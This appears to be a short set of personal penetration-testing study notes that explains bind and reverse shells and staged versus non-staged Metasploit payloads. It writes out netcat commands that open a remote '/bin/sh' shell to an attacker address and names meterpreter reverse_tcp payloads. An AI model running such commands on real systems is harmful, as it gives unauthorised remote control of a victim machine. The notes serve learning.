# Attack

 ## Shells
  - Bind shell
     - Attacker connects to victim
     
         example:
            
            Victim would run: ns -lvp 4444 -e /bin/sh (listen for the connection request)  
            Attacker would run: nc 192.168.1.1 4444   (establish /bin/sh (shell) once connected)          
              
  
  - Reverse shell
      - Victim system connects to us
        
          example: 
          
              Victim would run: nc 192.168.1.1 4444 -e /bin/sh  (establish /bin/sh (shell) once connected)
              Attacker would run: ns -lvp 4444 (listen for the connection request)
              
              
       
# staged vs non-staged payloads

  Note: payloads are what runs as the exploit
  
  - Non-staged
     - Sends exploit shell codes all at once
     - larger in size, wont always work
                                    V    One stage      V
     - metasploit example: windows/meterpreter_reverse_tcp

  - staged
     - Sends payload in stages
     - Can be less stable 
                                    Stage 1 V   Stage 2 V
     - metasploit example: windows/meterpreter/reverse_tcp
     
                                      
### NOTE: exploit may be right, but not all payloads work
